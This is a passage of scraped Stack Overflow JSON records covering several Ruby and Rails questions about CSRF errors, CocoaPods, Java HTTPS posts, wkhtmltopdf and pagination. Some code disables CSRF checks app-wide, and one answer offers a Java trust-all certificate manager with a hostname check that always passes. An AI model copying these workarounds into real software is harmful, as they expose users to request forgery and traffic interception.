"link": "https://stackoverflow.com/questions/52077158/protect-from-forgery-with-null-session-still-getting-cant-verify-csrf-toke", "title": "protect_from_forgery with: :null_session -- still getting Can&#39;t verify CSRF token authenticity", "body": "<p>I have a React Native app making POST requests to a Rails backend. Even though I inserted <code>protect_from_forgery with: :null_session</code> in the <code>ApplicationController</code>. All the POST requests I make are failing and I'm getting the error: </p>\n\n<blockquote>\n  <p>Can't verify CSRF token authenticity</p>\n</blockquote>\n\n<p>This is one of the controllers in my Rails backend that I make the POST request to: </p>\n\n<pre><code>class AddressesController &lt; ApplicationController\n\n  def show\n    address = Address.find(params[:id])\n  end \n\n  def create\n    address = Address.new(address_params)\n\n    if address.save\n      render json: {status: 'address created successfully'}, status: :create\n    else\n      render json: { errors: address.errors.full_messages }, status: :bad_request\n    end\n  end \n\n  def address_params\n    params.require(:address).permit(:streetname, :zipcode, :city, :country)\n  end\n\nend\n</code></pre>\n\n<p>I've also tried to <code>protect_from_forgery unless: -&gt; { request.format.json? }</code> as I'm sending a JSON POST request, but still I'm getting the same error. Can anyone offer a different solution? Any help would be much appreciated! Thanks in Advance!</p>\n\n<p><strong>Question Update</strong>:</p>\n\n<p>I followed what this guy did in this <a href=\"https://stackoverflow.com/questions/5669322/turn-off-csrf-token-in-rails-3\">link</a>. And I inserted the following instead: </p>\n\n<pre><code>class ApplicationController &lt; ActionController::Base\n  skip_before_action :verify_authenticity_token\nend\n</code></pre>\n\n<p>Now I'm not getting \"Can't verify CSRF token authenticity\" as an error, but  I'm still getting an 500 (Internal Server Error) response from my server in the terminal. The values are not being saved for some reason. This is the error, I get: </p>\n\n<pre><code>  Address Create (0.4ms)  INSERT INTO \"addresses\" (\"streetname\", \"zipcode\", \"city\", \"country\", \"created_at\", \"updated_at\") VALUES (?, ?, ?, ?, ?, ?)  [[\"streetname\", \"Imenstrade 39\"], [\"zipcode\", \"1082AK\"], [\"city\", \"Amsterdam\"], [\"country\", \"The Netherlands\"], [\"created_at\", \"2018-08-29 12:23:22.261020\"], [\"updated_at\", \"2018-08-29 12:23:22.261020\"]]\n  \u21b3 app/controllers/addresses_controller.rb:10\n   (2.2ms)  commit transaction\n  \u21b3 app/controllers/addresses_controller.rb:10\nCompleted 500 Internal Server Error in 12ms (Views: 0.2ms | ActiveRecord: 3.2ms)\n</code></pre>\n"}, {"tags": ["ios", "ruby", "dns", "cocoapods"], "comments": [{"owner": {"reputation": 12629, "user_id": 4739257, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/MdhEs.jpg?s=128&g=1", "display_name": "Ilya", "link": "https://stackoverflow.com/users/4739257/ilya"}, "edited": false, "score": 0, "creation_date": 1535546358, "post_id": 52076749, "comment_id": 91105048, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/49800432/gem-cannot-access-rubygems-org\">gem cannot access rubygems.org</a>"}], "answers": [{"tags": [], "owner": {"reputation": 41265, "user_id": 967484, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/nBS9m.jpg?s=128&g=1", "display_name": "Alex Stone", "link": "https://stackoverflow.com/users/967484/alex-stone"}, "is_accepted": true, "score": 1, "last_activity_date": 1535726441, "creation_date": 1535726441, "answer_id": 52117794, "question_id": 52076749, "link": "https://stackoverflow.com/questions/52076749/cocoapods-on-mac-unable-to-install-could-not-find-a-valid-gem-cocoapods-0/52117794#52117794", "title": "Cocoapods on Mac unable to install &quot;Could not find a valid gem &#39;cocoapods&#39; (&gt;= 0)&quot;", "body": "<p>The problem was resolved by connecting to a mobile hotspot and updating ruby through that. </p>\n"}], "owner": {"reputation": 41265, "user_id": 967484, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/nBS9m.jpg?s=128&g=1", "display_name": "Alex Stone", "link": "https://stackoverflow.com/users/967484/alex-stone"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2545, "favorite_count": 0, "accepted_answer_id": 52117794, "answer_count": 1, "score": 1, "last_activity_date": 1543828923, "creation_date": 1535543376, "question_id": 52076749, "link": "https://stackoverflow.com/questions/52076749/cocoapods-on-mac-unable-to-install-could-not-find-a-valid-gem-cocoapods-0", "title": "Cocoapods on Mac unable to install &quot;Could not find a valid gem &#39;cocoapods&#39; (&gt;= 0)&quot;", "body": "<p>I have one office Mac running MacOS 10.13.2 and Ruby 2.2.1 and it is unable to install or run cocoapods via gems. <code>sudo gem install cocoapods</code> returns the error below. I compared the proxy and DNS configuration and it is identical to other macs that can install successfully. </p>\n\n<pre><code>\u25b6 ping https://rubygems.org\nping: cannot resolve https://rubygems.org: Unknown host\n</code></pre>\n\n<p><strong>What is causing cocoapods installation to fail with the cryptic  no such name (<a href=\"https://rubygems.org/specs.4.8.gz\" rel=\"nofollow noreferrer\">https://rubygems.org/specs.4.8.gz</a>) error message?</strong></p>\n\n<p>I tried the answer from this question: <a href=\"https://stackoverflow.com/questions/36972339/sudo-gem-install-cocoapods-doesnt-work-on-elcapitan-10-11-4-error-could-no\">&#39;sudo gem install cocoapods&#39; doesn&#39;t work on ElCapitan 10.11.4 , ERROR: Could not find a valid gem &#39;cocoapods&#39; (&gt;= 0) in any repository</a></p>\n\n<pre><code>$ sudo gem install cocoapods --source http://rubygems.org\n</code></pre>\n\n<blockquote>\n  <p>ERROR:  Could not find a valid gem 'cocoapods' (>= 0), here is why:\n            Unable to download data from <a href=\"https://rubygems.org/\" rel=\"nofollow noreferrer\">https://rubygems.org/</a> - no such name (<a href=\"https://rubygems.org/specs.4.8.gz\" rel=\"nofollow noreferrer\">https://rubygems.org/specs.4.8.gz</a>)\n            Unable to download data from <a href=\"http://rubygems.org/\" rel=\"nofollow noreferrer\">http://rubygems.org/</a> - no such name (<a href=\"http://rubygems.org/specs.4.8.gz\" rel=\"nofollow noreferrer\">http://rubygems.org/specs.4.8.gz</a>)</p>\n</blockquote>\n"}, {"tags": ["java", "ruby", "http", "ssl", "groovy"], "answers": [{"comments": [{"owner": {"reputation": 49, "user_id": 826704, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65fe2854dc7e408d036756d2e102cbd8?s=128&d=identicon&r=PG", "display_name": "hakuya", "link": "https://stackoverflow.com/users/826704/hakuya"}, "edited": false, "score": 0, "creation_date": 1535603585, "post_id": 52076750, "comment_id": 91128589, "body": "Hi Yug thanks for answering, I have tried your code but I got an error &quot;FAILED because (of) org.codehaus.groovy.runtime.typehandling.GroovyCastException&zwnj;&#8203;: Cannot cast object &#39;blabla.RestApi$2@c7a977f&#39; with class &#39;blabla.RestApi$2&#39; to class &#39;oracle.net.jndi.TrustManager&#39;, any clue?"}], "tags": [], "owner": {"reputation": 2531, "user_id": 6407858, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh5.googleusercontent.com/-u3sR4b4UZWY/AAAAAAAAAAI/AAAAAAAAABQ/A635K1ESMs8/photo.jpg?sz=128", "display_name": "Yug Singh", "link": "https://stackoverflow.com/users/6407858/yug-singh"}, "is_accepted": false, "score": 0, "last_activity_date": 1535543376, "creation_date": 1535543376, "answer_id": 52076750, "question_id": 52076592, "link": "https://stackoverflow.com/questions/52076592/convert-http-post-from-ruby-into-java-or-groovy/52076750#52076750", "title": "Convert HTTP post from ruby into java or groovy", "body": "<p>You can make use of solution mentioned <a href=\"https://stackoverflow.com/a/22524546/6407858\">here</a>. As per this solution you can implement a method <code>doTrustToCertificates()</code> and then call this method before setting the connection:</p>\n\n<pre><code>public void doTrustToCertificates() throws Exception {\n        Security.addProvider(new com.sun.net.ssl.internal.ssl.Provider());\n        TrustManager[] trustAllCerts = new TrustManager[]{\n                new X509TrustManager() {\n                    public X509Certificate[] getAcceptedIssuers() {\n                        return null;\n                    }\n\n                    public void checkServerTrusted(X509Certificate[] certs, String authType) throws CertificateException {\n                        return;\n                    }\n\n                    public void checkClientTrusted(X509Certificate[] certs, String authType) throws CertificateException {\n                        return;\n                    }\n                }\n        };\n\n        SSLContext sc = SSLContext.getInstance(\"SSL\");\n        sc.init(null, trustAllCerts, new SecureRandom());\n        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());\n        HostnameVerifier hv = new HostnameVerifier() {\n            public boolean verify(String urlHostName, SSLSession session) {\n                if (!urlHostName.equalsIgnoreCase(session.getPeerHost())) {\n                    System.out.println(\"Warning: URL host '\" + urlHostName + \"' is different to SSLSession host '\" + session.getPeerHost() + \"'.\");\n                }\n                return true;\n            }\n        };\n        HttpsURLConnection.setDefaultHostnameVerifier(hv);\n    }\n</code></pre>\n\n<p>Call <code>doTrustToCertificates()</code> before trying to connect to URL as shown below:</p>\n\n<pre><code>    public void loginApiWithEmailPassword(String sEmail, String sPassword){\n            URL url = new URL(m_url + \"/login/password\");\n            JSONObject json = new JSONObject();\n            json.put(\"email\", sEmail);\n            json.put(\"password\", sPassword);\n            doTrustToCertificates();/\n            HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n// set header\n            conn.setRequestMethod(\"POST\")\n            conn.setRequestProperty(\"Content-Type\", \"application/json\");\n            conn.setRequestProperty(\"user-agent\", aaa);\n            conn.setRequestProperty(\"x-request-id\", getSecureRandom(s))\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n\n            OutputStream os = conn.getOutputStream();\n\n            os.write(json.toJSONString().getBytes());\n            os.close();\n\n            // read the response\n            InputStream input = new BufferedInputStream(conn.getInputStream());\n            String result = org.apache.commons.io.IOUtils.toString(input, \"UTF-8\");\n            JSONObject jsonObject = new JSONObject(result);\n\n\n            input.close();\n            conn.disconnect();\n\n            return jsonObject;\n        }\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 9807, "user_id": 204769, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/cc5f3bf8b3cb91c985ed4fd046aa451d?s=128&d=identicon&r=PG", "display_name": "rdmueller", "link": "https://stackoverflow.com/users/204769/rdmueller"}, "is_accepted": false, "score": 0, "last_activity_date": 1535719509, "creation_date": 1535719509, "answer_id": 52115764, "question_id": 52076592, "link": "https://stackoverflow.com/questions/52076592/convert-http-post-from-ruby-into-java-or-groovy/52115764#52115764", "title": "Convert HTTP post from ruby into java or groovy", "body": "<p>So, your main problem is that Java does not trust your certificate out of the box.\nThe solution mentioned by Yug Singh to change the TrustManager should work if done right, but it is IMHO not very clean.</p>\n\n<p>The better solution is to get the certificate you want to trust (normally you can download it via your browser by clicking on the small lock-symbol in the URL) and add it to the java trustStore of your machine or if you only want to trust it for this piece of code, create a new trustStore and instruct java to use this trustStore.</p>\n\n<p>Information on how to use a trsutStore can be found in several locations like the oracle docs: <a href=\"https://docs.oracle.com/cd/E19509-01/820-3503/6nf1il6er/index.html\" rel=\"nofollow noreferrer\">https://docs.oracle.com/cd/E19509-01/820-3503/6nf1il6er/index.html</a> and <a href=\"https://docs.oracle.com/cd/E19830-01/819-4712/ablqw/index.html\" rel=\"nofollow noreferrer\">https://docs.oracle.com/cd/E19830-01/819-4712/ablqw/index.html</a></p>\n\n<p>basically, you create the trustStore via</p>\n\n<pre><code>keytool -import -file theCertificateToBeTrusted.cert -alias justSomeAlias -keystore myTrustStore\n</code></pre>\n\n<p>and you isntruct java to use this keyStore by starting it with some extra parameters</p>\n\n<pre><code>-Djavax.net.ssl.trustStore=/path/toYour/myTrustStore\n</code></pre>\n\n<p>(I think you don't need to set a password on the trustStore for this use case)</p>\n\n<p>also have a look at this SO answer: <a href=\"https://stackoverflow.com/questions/23465472/using-browsers-certificate-in-java-program\">Using browser&#39;s certificate in java program</a></p>\n"}], "owner": {"reputation": 49, "user_id": 826704, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65fe2854dc7e408d036756d2e102cbd8?s=128&d=identicon&r=PG", "display_name": "hakuya", "link": "https://stackoverflow.com/users/826704/hakuya"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 85, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1535719509, "creation_date": 1535542821, "question_id": 52076592, "link": "https://stackoverflow.com/questions/52076592/convert-http-post-from-ruby-into-java-or-groovy", "title": "Convert HTTP post from ruby into java or groovy", "body": "<p>I have some code of ruby http post for hitting the API, but right now I need to convert it into java or groovy</p>\n\n<p>this is my code on ruby</p>\n\n<pre><code>def loginWithEmailPassword(str_email, str_password)\n  uri = URI(url)\n\n  req = Net::HTTP::Post.new(uri)\n  req['Content-Type'] = 'application/json'\n  req['x-request-id'] = \"xyz-#{SecureRandom.hex}\"\n  req['user-agent'] = 'xyz'\n\n  req.body = { \n  email: str_email, \n  password: str_password\n  }.to_json\n\n  Net::HTTP.start(uri.host, uri.port,\n    :use_ssl =&gt; uri.scheme == 'https',\n    :verify_mode =&gt; OpenSSL::SSL::VERIFY_NONE) do |http|\n    response = http.request(req) # Net::HTTPResponse object\n\n    if(response.code != '200')\n      puts response.body # Show response body\n      raise (\"ERROR: login error... error code #{response.code}\")\n    end\n    return response.body\n  end\nend\n</code></pre>\n\n<p>This are my code on java</p>\n\n<pre><code>    def loginApiWithEmailPassword(String sEmail, String sPassword){\n            URL url = new URL(m_url + \"/login/password\");\n            JSONObject json = new JSONObject();\n            json.put(\"email\", sEmail);\n            json.put(\"password\", sPassword);\n            HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n// set header\n            conn.setRequestMethod(\"POST\")\n            conn.setRequestProperty(\"Content-Type\", \"application/json\");\n            conn.setRequestProperty(\"user-agent\", aaa);\n            conn.setRequestProperty(\"x-request-id\", getSecureRandom(s))\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n\n            OutputStream os = conn.getOutputStream();\n\n            os.write(json.toJSONString().getBytes());\n            os.close();\n\n            // read the response\n            InputStream input = new BufferedInputStream(conn.getInputStream());\n            String result = org.apache.commons.io.IOUtils.toString(input, \"UTF-8\");\n            JSONObject jsonObject = new JSONObject(result);\n\n\n            input.close();\n            conn.disconnect();\n\n            return jsonObject;\n        }\n</code></pre>\n\n<p>I have tried to convert it into java but failed, stuck on error <code>\"javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target\"</code></p>\n\n<p>And unable to continue to check the next function, may anyone able to help me to complete the http post for java or groovy</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "ruby-on-rails-3", "wkhtmltopdf"], "comments": [{"owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1535544765, "post_id": 52076363, "comment_id": 91103992, "body": "Can you please add error in Question ?"}, {"owner": {"reputation": 40, "user_id": 7850533, "user_type": "registered", "profile_image": "https://graph.facebook.com/1447836771934645/picture?type=large", "display_name": "Smriti Gupta", "link": "https://stackoverflow.com/users/7850533/smriti-gupta"}, "edited": false, "score": 0, "creation_date": 1535545193, "post_id": 52076363, "comment_id": 91104294, "body": "Added, could anyone suggest a way how to make header point to local path. As suggested in <a href=\"https://github.com/wkhtmltopdf/wkhtmltopdf/issues/2093#issuecomment-167955213\" rel=\"nofollow noreferrer\">github.com/wkhtmltopdf/wkhtmltopdf/issues/&hellip;</a>"}, {"owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1535545781, "post_id": 52076363, "comment_id": 91104655, "body": "try <code>ulimit -n 2048</code> command in terminal. then try to generate pdf again. let me know if it works or not"}, {"owner": {"reputation": 40, "user_id": 7850533, "user_type": "registered", "profile_image": "https://graph.facebook.com/1447836771934645/picture?type=large", "display_name": "Smriti Gupta", "link": "https://stackoverflow.com/users/7850533/smriti-gupta"}, "reply_to_user": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1535560958, "post_id": 52076363, "comment_id": 91115060, "body": "Tried by increasing the limit to 2048, 10k as well.It didnt work out"}, {"owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1535604058, "post_id": 52076363, "comment_id": 91128700, "body": "What if your remove header and footer and then try again to generate pdf ?"}, {"owner": {"reputation": 40, "user_id": 7850533, "user_type": "registered", "profile_image": "https://graph.facebook.com/1447836771934645/picture?type=large", "display_name": "Smriti Gupta", "link": "https://stackoverflow.com/users/7850533/smriti-gupta"}, "reply_to_user": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1535606505, "post_id": 52076363, "comment_id": 91129325, "body": "Without header and footer 1100 pages takes 3 minuts, and get downlaoded."}, {"owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1535606567, "post_id": 52076363, "comment_id": 91129341, "body": "Didn&#39;t you use background job ?"}, {"owner": {"reputation": 40, "user_id": 7850533, "user_type": "registered", "profile_image": "https://graph.facebook.com/1447836771934645/picture?type=large", "display_name": "Smriti Gupta", "link": "https://stackoverflow.com/users/7850533/smriti-gupta"}, "reply_to_user": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1535649264, "post_id": 52076363, "comment_id": 91155452, "body": "No, we are not using background jobs. We have to generate pdf on fly, since in every minute that data going to dynamic."}, {"owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1535689466, "post_id": 52076363, "comment_id": 91167454, "body": "Yeah, but if it takes time of 3 minutes, then you should use background, user won&#39;t  wait for 3 minutes to complete one request"}], "owner": {"reputation": 40, "user_id": 7850533, "user_type": "registered", "profile_image": "https://graph.facebook.com/1447836771934645/picture?type=large", "display_name": "Smriti Gupta", "link": "https://stackoverflow.com/users/7850533/smriti-gupta"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 79, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1535545567, "creation_date": 1535542040, "last_edit_date": 1535545567, "question_id": 52076363, "link": "https://stackoverflow.com/questions/52076363/wkhtmltopdf-falis-for-1000-pages-ruby-on-rails", "title": "wkhtmltopdf falis for 1000+ pages ruby on rails", "body": "<p>Generating a pdf of 1000+ pages fails in case of header supplied.\nlayouts/header is a header.pdf.haml file.\nAfter going through various suggestions, increased the open files limit on ubuntu also didn't work.</p>\n\n<pre><code>respond_to do |format|\n  format.html\n  format.xlsx\n  format.pdf { render pdf: \"Test report\", dispoistion: :attachment,\n      :show_as_html =&gt; (params[:d].present? &amp;&amp; params[:d] == \"true\"),\n      layout: \"pdf.html.haml\",\n      margin: {\n        top: 38\n      },\n      header: {\n        spacing: 2,\n        html: {\n          template: 'layouts/header',\n          formats:  [:pdf],\n          handlers: [:haml],\n          layout: nil,\n          locals: {\n            title: \"Test Report\"\n          }\n        }\n    }\n  }\nend\n</code></pre>\n\n<blockquote>\n  <p>RuntimeError (Failed to execute:\n  [\"/shared/bundle/ruby/2.2.0/bin/wkhtmltopdf\", \"-q\", \"--page-size\",\n  \"Letter\", \"--margin-top\", \"38\", \"--header-spacing\", \"2\",\n  \"--header-html\",\n  \"file:////tmp/wicked_header_pdf20180828-94225-2oante.html\",\n  \"--footer-left\", \"Test Online\", \"--footer-right\", \"Page [page] of\n  [topage]\", \"file:////tmp/wicked_pdf20180828-94225-f0g5x0.html\",\n  \"/tmp/wicked_pdf_generated_file20180828-94225-80q49r.pdf\"] Error: PDF\n  could not be generated! PaintDevice: Cannot destroy paint device that\n  is being painted ):</p>\n</blockquote>\n\n<p>Added, could anyone suggest a way how to make header point to local path.\nAs suggested in <a href=\"https://github.com/wkhtmltopdf/wkhtmltopdf/issues/2093#issuecomment-167955213\" rel=\"nofollow noreferrer\">https://github.com/wkhtmltopdf/wkhtmltopdf/issues/2093#issuecomment-167955213</a></p>\n"}, {"tags": ["ruby", "ruby-on-rails-4", "rubygems"], "answers": [{"tags": [], "owner": {"reputation": 686, "user_id": 1491410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c938ed150a685b33d1b91266b382c8d?s=128&d=identicon&r=PG", "display_name": "elliotcm", "link": "https://stackoverflow.com/users/1491410/elliotcm"}, "is_accepted": false, "score": 0, "last_activity_date": 1535570642, "creation_date": 1535570642, "answer_id": 52084736, "question_id": 52075234, "link": "https://stackoverflow.com/questions/52075234/unable-to-run-in-production-mode-on-heroku-server/52084736#52084736", "title": "Unable to run in production mode on heroku server", "body": "<p>The <code>10.*</code> range of IPs is private, meaning the code running the web console is seeing another heroku machine as the source.  This is usually what happens if the code is not taking into account headers like <code>X-Forwarded-For</code>.</p>\n\n<p>You might find it easier to use the web console that heroku provide.</p>\n"}], "owner": {"reputation": 1886, "user_id": 1138557, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/c35c06fc5605d4d1e73e17dd8113426f?s=128&d=identicon&r=PG&f=1", "display_name": "Thorin", "link": "https://stackoverflow.com/users/1138557/thorin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 54, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1535570642, "creation_date": 1535538529, "last_edit_date": 1535539255, "question_id": 52075234, "link": "https://stackoverflow.com/questions/52075234/unable-to-run-in-production-mode-on-heroku-server", "title": "Unable to run in production mode on heroku server", "body": "<p>I have an application which is deployed on heroku and for some reasons I want to enable web console there.\nThis is the setup details:\nIn Gemfile</p>\n\n<pre><code>ruby '2.3.0'\n\nrails 4.2\n\nweb console 3.3.0\n</code></pre>\n\n<p>in Application.rb</p>\n\n<pre><code>config.web_console.development_only = false\n config.web_console.whitelisted_ips = [MY IP ADDRESS]\n</code></pre>\n\n<p>When I tried to run on local with production env it is working fine even when I add other machine IP address(connected via LAN) and try to access the web app installed on my machine it seems working(when I remove their IP address then it is not showing any console on web pages) so I can say config.web_console.whiltelisted_ips configuration is working.</p>\n\n<p>but when I add my external IP address(public IP address) in whitelisted ips and push to heroku then I am unable to see web console there.</p>\n\n<p>always sees some random ips there in console like this:</p>\n\n<pre><code>Cannot render console from 10.63.146.94! Allowed networks: 103.15.67.226, 174.129.192.200, 127.0.0.0/127.255.255.255, ::1\n</code></pre>\n\n<p>and this '10.63.146.94!' change always.</p>\n\n<p>I am not sure where I am missing something or there are some error in gem?</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535534994, "post_id": 52074025, "comment_id": 91097726, "body": "Please explain your question a bit more. Provide some context."}, {"owner": {"reputation": 1, "user_id": 10091508, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/88eb698bcbe36374ddbb7e7766ca47de?s=128&d=identicon&r=PG&f=1", "display_name": "user10091508", "link": "https://stackoverflow.com/users/10091508/user10091508"}, "reply_to_user": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535535411, "post_id": 52074025, "comment_id": 91098013, "body": "@JagdeepSingh I updated the question"}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535535692, "post_id": 52074025, "comment_id": 91098178, "body": "Where you want to get the count? What&#39;s the purpose?"}, {"owner": {"reputation": 5800, "user_id": 4287733, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/835e993afb1e20c1981dd6b8b59ded2d?s=128&d=identicon&r=PG", "display_name": "Nermin", "link": "https://stackoverflow.com/users/4287733/nermin"}, "edited": false, "score": 1, "creation_date": 1535535704, "post_id": 52074025, "comment_id": 91098183, "body": "You should not name controller action with name <code>post</code>"}], "answers": [{"tags": [], "owner": {"reputation": 1556, "user_id": 2830852, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/31ea598b6bc18b59de1e77a4c6f6c3e5?s=128&d=identicon&r=PG", "display_name": "Tarek N. Elsamni", "link": "https://stackoverflow.com/users/2830852/tarek-n-elsamni"}, "is_accepted": false, "score": 0, "last_activity_date": 1535536176, "last_edit_date": 1535536176, "creation_date": 1535535606, "answer_id": 52074268, "question_id": 52074025, "link": "https://stackoverflow.com/questions/52074025/how-can-display-the-total-amount-of-data/52074268#52074268", "title": "How can display the total amount of data?", "body": "<p>If you want to know the total count of the posts regardless of the pagination, you can use:</p>\n\n<pre><code>Post.count\n</code></pre>\n\n<p>as per: <a href=\"https://apidock.com/rails/ActiveRecord/Calculations/ClassMethods/count\" rel=\"nofollow noreferrer\">https://apidock.com/rails/ActiveRecord/Calculations/ClassMethods/count</a></p>\n\n<p>Your code might look something like:</p>\n\n<pre><code>response = {\n  count: Post.count,\n  posts: paginate Post.all, per_page: 10\n}\nrender json: JSON.pretty_generate(response.as_json)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 280, "user_id": 7316787, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/816820e3b9b8c80a147cb698e5ec7d2d?s=128&d=identicon&r=PG", "display_name": "Rolandas Barysas", "link": "https://stackoverflow.com/users/7316787/rolandas-barysas"}, "is_accepted": false, "score": 0, "last_activity_date": 1535535692, "creation_date": 1535535692, "answer_id": 52074304, "question_id": 52074025, "link": "https://stackoverflow.com/questions/52074025/how-can-display-the-total-amount-of-data/52074304#52074304", "title": "How can display the total amount of data?", "body": "<p>Save all posts to a variable:</p>\n\n<pre><code>class PostsController &lt; ApplicationController\n  def post\n    all_posts = Post.all\n    posts = paginate all_posts, per_page: 10\n    render json: JSON.pretty_generate(posts.as_json)\n  end\nend\n</code></pre>\n\n<p>Now you can use <code>all_posts.size</code> to get all posts count.</p>\n"}, {"tags": [], "owner": {"reputation": 446, "user_id": 8356015, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PaYtW.jpg?s=128&g=1", "display_name": "Ravi Teja Dandu", "link": "https://stackoverflow.com/users/8356015/ravi-teja-dandu"}, "is_accepted": false, "score": 1, "last_activity_date": 1535537563, "creation_date": 1535537563, "answer_id": 52074929, "question_id": 52074025, "link": "https://stackoverflow.com/questions/52074025/how-can-display-the-total-amount-of-data/52074929#52074929", "title": "How can display the total amount of data?", "body": "<p>Based on the code you've pasted, I'm assuming you will be sending <code>page</code> value too as part of <code>params</code> and you want the total Posts count as well.</p>\n\n<p>If that is the case, you can write your code as follows:</p>\n\n<pre><code>response = {\n  posts_count: Post.count,\n  posts: Post.page(params[:page).per(10)\n}\nrender json: JSON.pretty_generate(response.as_json)\n</code></pre>\n\n<p>Hope this helped.</p>\n"}], "owner": {"reputation": 1, "user_id": 10091508, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/88eb698bcbe36374ddbb7e7766ca47de?s=128&d=identicon&r=PG&f=1", "display_name": "user10091508", "link": "https://stackoverflow.com/users/10091508/user10091508"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 55, "favorite_count": 0, "answer_count": 3, "score": -2, "last_activity_date": 1535553826, "creation_date": 1535534813, "last_edit_date": 1535553826, "question_id": 52074025, "link": "https://stackoverflow.com/questions/52074025/how-can-display-the-total-amount-of-data", "title": "How can display the total amount of data?", "body": "<p>I use rails 5.1.6 I use gem kaminari and api-pagination for pagination. </p>\n\n<p>How to find the total count of the posts from the pagination.\nSince per_page gives 10 from the first page, and not the total number.</p>\n\n<p>How to get the total count of the posts even after pagination</p>\n\n<pre><code>class PostsController &lt; ApplicationController\n\n  def post\n    posts = paginate Post.all, per_page: 10\n    render json: JSON.pretty_generate(posts.as_json)\n  end\n\n  def index\n    post\n  end\n\nend\n</code></pre>\n"}, {"tags": ["ruby", "string", "indentation", "string-interpolation", "heredoc"], "comments": [{"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": 